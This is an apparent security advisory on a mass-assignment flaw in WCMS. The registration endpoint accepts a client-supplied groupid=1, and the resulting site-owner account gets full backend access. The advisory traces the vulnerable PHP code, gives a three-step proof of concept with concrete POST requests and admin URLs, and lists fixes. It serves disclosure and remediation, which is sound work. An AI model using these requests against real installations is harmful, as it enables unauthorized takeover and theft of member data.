# Mass Assignment in WCMS Anonymous Registration (POST groupid=1) Allows Any Unauthenticated User to Register a Site-Owner (groupid=1) Account and Take Over the Backend

## Summary

The anonymous registration endpoint of WCMS (a PHP MVC CMS) passes the entire $_POST array straight into MemberService::register(), which validates only mobile-phone length, password length, and username punctuation. No field whitelist or key filtering is applied, and the bundled CAPTCHA check (checkValidate) is never called. Because every POST key is treated as a real w_member_list column by the string-concatenating Db::add() helper, an unauthenticated attacker can append groupid=1 to a normal registration request and create an account in the site-owner group. The account is then used with the ordinary login flow (anonymous/setlogin) to obtain a legitimate openid cookie; AdminController only checks groupid==1 before granting full backend access.

## Details

Root cause: WCMS never separates user-controllable registration fields from server-protected member attributes, and its database helper builds INSERT statements by string concatenation of every key/value pair. Trust-boundary failure: groupid (and other privileged columns such as status/verify/manager) is accepted from the client on the public, unauthenticated /index.php?anonymous/setregister endpoint instead of being assigned server-side.

Source-to-sink path:

1. Source — AnonymousController::setRegister() (app/controllers/AnonymousController.php:35-39) passes the raw $_POST array to MemberService::register($_POST) and echoes the JSON result. This controller extends Action and has no login or admin requirement; config/authorize.php is not consulted by the dispatcher.
2. Trust-boundary failure — MemberService::register($userInfo) (app/service/MemberService.php:66-111) only enforces strlen(mobile_phone)==11, strlen(password)>=5, and a punctuation filter on username (filter() at lines 308-313 rejects only * . / ? - % !). It never unsets or whitelists keys, never forces a default groupid, and never calls the existing checkValidate() CAPTCHA method. The request key groupid therefore survives into $userInfo untouched.
3. Sink — MemberModel::addMember() (app/pojo/MemberModel.php:14-17) forwards the whole array to Db::add() (lib/Db.php:102-108), which calls batchAddArr() (lib/Db.php:146-167) and emits `INSERT INTO w_member_list (`key`,...) VALUES ('value',...)` for every key. groupid is a real column of w_member_list (wcms.sql table definition at lines 105-139), so an attacker-supplied groupid=1 is written verbatim.
4. Authorization gate — AdminController::__construct() (app/admin/AdminController.php:33-41) grants access to every app/admin management action whenever the resolved member has groupid==1 (and status >= 0). After registering with groupid=1, the attacker logs in via POST /index.php?anonymous/setlogin (MemberService::login at app/service/MemberService.php:117-131), receives the normal openid cookie, and is treated as a site owner.

Why each fragment is exploitable: the registration endpoint is reachable without authentication and without CAPTCHA or rate limiting; the register() function applies no per-key allow-listing, so groupid is persisted; Db::add() concatenates column names and values without any escaping of the key set, and w_member_list contains the groupid column used by AdminController as the only admin authorization condition.

Core vulnerable code path:

```php
// app/controllers/AnonymousController.php:35-39
public function setRegister ()
    {
        $rs = self::getMemberService()->register($_POST);
        $this->sendNotice($rs['message'], null, $rs['status']);
    }
```

Unauthenticated entry point: the raw, attacker-controlled $_POST array (including any extra key such as groupid) is forwarded without any allow-list into MemberService::register().

```php
// app/service/MemberService.php:66-111
public function register ($userInfo)
    {
        if (strlen($userInfo['mobile_phone']) != 11) {
            return array('status'=>false,'message'=>"手机号码为11位数");
        }
        if (strlen($userInfo['password']) < 5) {
            return array('status'=>false,'message'=>"密码至少为5位数");
        }
        if ($this->filter($userInfo['username'])) {
            return array('status'=>false,'message'=>"用户名中包含了标点符号");
        }
        $moblie = MemberModel::instance()->getMemberByMobile($userInfo['mobile_phone']);
        if (! empty($moblie)) {
            return array('status'=>false,'message'=>"手机号码重复了!");
        }
        $salt=$this->getRandNum(6);
        $userInfo['salt']=$salt;
        $userInfo['password']= md5(md5( $userInfo['password']) . $salt);
        $ret=MemberModel::instance()->addMember($userInfo);
    }
```

Trust-boundary failure: only phone/password length and username punctuation are validated. No key whitelist (e.g. array_intersect_key) is applied and no server-side default for groupid/status/verify/manager is enforced, so a client-supplied groupid=1 remains in $userInfo and reaches addMember().

```php
// lib/Db.php:102-108
protected function add ($table, $params)
    {
        $arr = $this->batchAddArr($params);
         $sql = "INSERT INTO $table $arr";
        $this->exec($sql);
        return $this->lastInsertId();
    }
```

Sink: Db::add() (called by MemberModel::addMember() at app/pojo/MemberModel.php:14-17) builds the INSERT by concatenating every array key as a column name and every value inside quotes (batchAddArr, lib/Db.php:146-167). groupid is a real column of w_member_list (wcms.sql:105-139), so the injected groupid=1 is persisted with the new account.

```php
// app/admin/AdminController.php:33-41
if($this->_user_global['status']<0){
            $this->sendNotice("账号异常", null, false);
        }


        if($this->_user_global['groupid']!=1){
            echo "权限不足,请等待管理员审核!";
            exit();
        }
```

Authorization gate: every backend controller inherits AdminController and releases full admin functionality when the authenticated member has groupid==1. Because groupid was attacker-controlled at registration time, the new account passes this check and receives complete backend access.

## POC

Preconditions:

- The target is a running WCMS installation (database seeded from wcms.sql, so w_member_list and its groupid column exist).
- The anonymous endpoints are reachable: POST /index.php?anonymous/setregister and POST /index.php?anonymous/setlogin (no authentication, no CAPTCHA, no rate limiting on these actions).
- An unused 11-digit mobile number.

Steps:

1. Register an account and include the privileged field groupid=1 in the body (mass assignment).
   Method: POST
   Endpoint: /index.php?anonymous/setregister
   Header: Content-Type: application/x-www-form-urlencoded
   Body (summary): mobile_phone=13900000001&password=Abc123456&username=hackadmin&groupid=1
   Expected result: {"status":true,"message":"注册成功"}; the row inserted into w_member_list carries groupid=1.
   <img width="2461" height="985" alt="image" src="https://github.com/user-attachments/assets/a3f3e436-e201-4f16-bb56-507b963f90ab" />

2. Log in with the just-registered credentials to obtain the server-issued openid cookie.
   Method: POST
   Endpoint: /index.php?anonymous/setlogin
   Header: Content-Type: application/x-www-form-urlencoded
   Body (summary): mobile_phone=13900000001&password=Abc123456
   Expected result: JSON response with data.openid.
   <img width="2448" height="953" alt="image" src="https://github.com/user-attachments/assets/ac1b2954-666b-4f49-ac42-aa870751a07a" />

3. Access a backend management page with the openid cookie to confirm site-owner access.
   Method: GET
   Endpoint: /index.php?advadmin/adv (other reachable backends: /index.php?articleadmin/getallcon, /index.php?memberadmin/getallmember, /index.php?commentadmin/getallcomment)
   Header: Cookie: openid=<openid from step 2>
   Expected result: HTTP 200 with the admin page (e.g. advertisement management), instead of the '请先登录!' redirect.
   <img width="2454" height="1386" alt="image" src="https://github.com/user-attachments/assets/2a2e7ad1-4fd0-4875-9cf5-01d842566e4a" />


## Impact

Any anonymous attacker can register an account with groupid=1 (site-owner group) and thereby obtain complete backend management privileges: article/advertisement/category/member administration, deletion of content, and access to all member data (usernames, password hashes, mobile numbers, e-mail addresses). Because the backend also contains unrestricted file upload (lib/Image.php), this mass-assignment flaw is a direct stepping stone to remote code execution and full takeover of the web server and database. Confidentiality, integrity and availability are all affected at the highest level.

## Remediation

1) Server-side field allow-listing: at the register() entry (app/service/MemberService.php:66) keep only required fields (e.g. username, mobile_phone, password) via array_intersect_key, and drop everything else before persisting.
2) Enforce server-side defaults for privileged columns: groupid, status, verify, manager, money, etc. must be set by the server (e.g. groupid=4 'registered member') and must never be accepted from the client.
3) Apply the same pattern to every other model-write path that currently persists raw $_POST/$_GET arrays (MemberModel::saveMemberByUid, AdvService/ArticleService update helpers).
4) Add CAPTCHA (the existing Captcha/checkValidate helper is available but unused) and rate limiting to register/login, and re-audit AdminController authorization so that only explicitly verified site-owner sessions reach admin actions.
5) Regression tests: attempt registration with extra fields (groupid, manager, status, verify) and assert they are ignored or overwritten by server defaults.

## Supplemental Information

### Affected products

- Vendor / project: WCMS
- Repository: https://gitee.com/wcms/WCMS
- Issue: https://gitee.com/wcms/WCMS/issues/IKDIQB
- Affected versions: 11
- Patched versions: none confirmed

### Vulnerability type

- Improper Privilege Management
- CWE: CWE-269 Improper Privilege Management
- Suggested severity: High

### Reporter

Guangzhou University: Wen Youwen, Wang Le
